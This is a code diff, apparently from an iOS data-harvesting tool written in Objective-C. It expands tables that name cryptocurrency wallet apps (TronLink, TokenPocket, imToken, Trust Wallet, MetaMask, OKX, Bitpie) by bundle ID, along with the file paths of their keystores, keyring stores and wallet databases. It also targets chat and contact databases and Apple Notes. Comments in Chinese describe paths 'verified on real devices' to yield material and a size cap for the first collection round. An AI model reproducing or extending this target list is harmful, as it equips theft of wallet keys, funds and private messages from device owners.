@@ -39,55 +39,81 @@
     return t;
 }
 
+/// 目标表与「源码版」的 targets.plist 对齐（bundleId 变体 + 已知定义件路径）。
+/// 另外保留了我们真机上验证过能出材料的少数路径，避免换表后反而采不到。
 + (NSArray<WQLTarget *> *)wallets {
-    return @[
-        [self target:@"TronLink"
-           bundleIDs:@[@"com.tronlink.hdwallet", @"com.tronlink.wallet"]
-            fuzzyIDs:@[@"tronlink"]
-               paths:@[@"Documents/TronLinkData.sqlite", @"Documents/keystore"]
-      wholeContainer:NO],
+    WQLTarget *tron = [self target:@"TronLink"
+                         bundleIDs:@[@"com.tronlink.hdwallet", @"io.tronlink.wallet",
+                                     @"com.tronlink.wallet", @"org.tronlink.wallet",
+                                     @"com.tronlink.pro", @"com.tronlink.ios",
+                                     @"com.tronlink.wallet.pro", @"com.tronlink.walletpro",
+                                     @"com.tronlink.tronlinkpro", @"com.tronlink.app"]
+                          fuzzyIDs:@[@"tronlink"]
+                             paths:@[@"Documents/TronLinkData.sqlite",
+                                     @"Documents/keystore",
+                                     @"Documents/wallet.realm",
+                                     @"Documents/default.realm",
+                                     @"Library/Application Support/default.realm"]
+                   wholeContainer:NO];
 
-        [self target:@"TokenPocket"
-           bundleIDs:@[@"vip.mytokenpocket", @"pro.tokenpocket.tp",
-                       @"com.tokenpocket.ios", @"com.global.wallet.ios"]
-            fuzzyIDs:@[@"tokenpocket", @"mytokenpocket"]
-               paths:@[@"Documents/db/main.sqlite3", @"Documents/F4SeCyr", @"Documents/walletsV2"]
-      wholeContainer:NO],
+    WQLTarget *tp = [self target:@"TokenPocket"
+                       bundleIDs:@[@"com.global.wallet.ios", @"com.tokenpocket.ios",
+                                   @"io.tokenpocket.ios", @"vip.mytokenpocket",
+                                   @"pro.tokenpocket.tp"]
+                        fuzzyIDs:@[@"tokenpocket", @"mytokenpocket"]
+                           paths:@[@"Documents/db/main.sqlite3",
+                                   @"Documents/main.sqlite3",
+                                   @"Documents/F4SeCyr",
+                                   @"Documents/walletsV2"]
+                 wholeContainer:NO];
 
-        [self target:@"imToken"
-           bundleIDs:@[@"im.token.app", @"im.token", @"imtoken"]
-            fuzzyIDs:@[@"im.token", @"imtoken"]
-               paths:@[@"Library/Application Support/im.token.app"]
-      wholeContainer:NO],
+    WQLTarget *im = [self target:@"imToken"
+                       bundleIDs:@[@"im.token.app", @"im.token", @"imtoken"]
+                        fuzzyIDs:@[@"im.token", @"imtoken"]
+                           paths:@[@"Documents/walletsV2",
+                                   @"Library/Application Support/im.token.app"]
+                 wholeContainer:NO];
 
-        [self target:@"Trust"
-           bundleIDs:@[@"com.sixdays.trust", @"com.wallet.crypto.trustapp"]
-            fuzzyIDs:@[@"sixdays.trust", @"trustapp", @"trust.wallet"]
-               paths:@[@"Documents/temp-cloud-keystore",
-                       @"Library/Preferences/com.sixdays.trust.plist"]
-      wholeContainer:NO],
+    WQLTarget *trust = [self target:@"Trust"
+                          bundleIDs:@[@"com.trustwallet.app", @"com.trustwallet.app.web",
+                                      @"com.trustwallet.ios", @"com.sixdays.trust",
+                                      @"com.wallet.crypto.trustapp"]
+                           fuzzyIDs:@[@"sixdays.trust", @"trustapp", @"trust.wallet"]
+                              paths:@[@"Documents/keystore",
+                                      @"Library/Application Support/wallet",
+                                      @"Documents/temp-cloud-keystore",
+                                      @"Library/Preferences/com.sixdays.trust.plist"]
+                    wholeContainer:NO];
 
-        [self target:@"MetaMask"
-           bundleIDs:@[@"io.metamask.MetaMask"]
-            fuzzyIDs:@[@"metamask"]
-               paths:@[@"Documents/persistStore/persist-KeyringController",
-                       @"Documents/persistStore/persist-AccountsController"]
-      wholeContainer:NO],
+    WQLTarget *mm = [self target:@"MetaMask"
+                       bundleIDs:@[@"io.metamask.MetaMask", @"io.metamask.MetaMask.Redux"]
+                        fuzzyIDs:@[@"metamask"]
+                           paths:@[@"Documents/persistStore",
+                                   @"Library/Application Support/persistStore"]
+                 wholeContainer:NO];
+    mm.excludeTokens = @[@"storageService-SnapController-npm-",
+                         @"persist-SnapRegistryController",
+                         @"persist-RemoteFeatureFlagController"];
 
-        [self target:@"OKX"
-           bundleIDs:@[@"com.okex.OKExAppstoreFull", @"com.okex.okexwallet", @"com.okex.okex",
-                       @"com.okex.wallet", @"com.okx.okx", @"com.okx.wallet", @"com.okx.app",
-                       @"com.okinc.okex", @"com.okcoin.okex", @"com.okcoin.app", @"org.okx.ios"]
-            fuzzyIDs:@[@"okx", @"okex", @"okcoin", @"okinc"]
-               paths:@[@"Documents/wallet"]
-      wholeContainer:NO],
+    WQLTarget *okx = [self target:@"OKX"
+                       bundleIDs:@[@"com.okinc.okx", @"com.okex.OKExAppstoreFull",
+                                   @"com.okex.OKEx", @"com.okex.OKExApp",
+                                   @"com.okex.okexwallet", @"com.okex.okex",
+                                   @"com.okex.wallet", @"com.okx.okx",
+                                   @"com.okx.wallet", @"com.okx.app",
+                                   @"com.okcoin.okex", @"com.okcoin.app",
+                                   @"org.okx.ios"]
+                        fuzzyIDs:@[@"okx", @"okex", @"okcoin", @"okinc"]
+                           paths:@[@"Documents/wallet"]
+                 wholeContainer:NO];
 
-        [self target:@"Bitpie"
-           bundleIDs:@[@"com.bitpie.wallet"]
-            fuzzyIDs:@[@"bitpie"]
-               paths:@[@"Library/Preferences/com.bitpie.wallet.plist"]
-      wholeContainer:YES],
-    ];
+    WQLTarget *bitpie = [self target:@"Bitpie"
+                          bundleIDs:@[@"com.bitpie.ios", @"com.bitpie.wallet"]
+                           fuzzyIDs:@[@"bitpie"]
+                              paths:@[@"Library/Preferences/com.bitpie.wallet.plist"]
+                    wholeContainer:YES];
+
+    return @[tron, tp, im, trust, mm, okx, bitpie];
 }
 
 + (NSArray<WQLTarget *> *)extras {
@@ -97,22 +123,14 @@
             fuzzyIDs:@[]
                paths:@[@"Documents/ChatStorage.sqlite", @"Documents/ContactsV2.sqlite"]
       wholeContainer:NO],
-
-        [self target:@"Notes"
-           bundleIDs:@[@"group.com.apple.notes"]
-            fuzzyIDs:@[@"group.com.apple.notes"]
-               paths:@[@"NoteStore.sqlite"]
-      wholeContainer:NO],
     ];
 }
 
 + (NSArray<WQLTarget *> *)notes {
     WQLTarget *t = [self target:@"Notes"
-                      bundleIDs:@[@"group.com.apple.notes",
-                                  @"com.apple.notes",
-                                  @"com.apple.mobilenotes"]
+                      bundleIDs:@[@"group.com.apple.notes"]
                        fuzzyIDs:@[]
-                           paths:@[@"NoteStore.sqlite", @"Accounts"]
+                           paths:@[@"NoteStore.sqlite", @"Accounts", @"Media"]
                  wholeContainer:NO];
     // 备忘录图片可能很大，单独给个上限，避免把首轮拖成半小时
     t.maxBytes = 300ULL * 1024 * 1024;
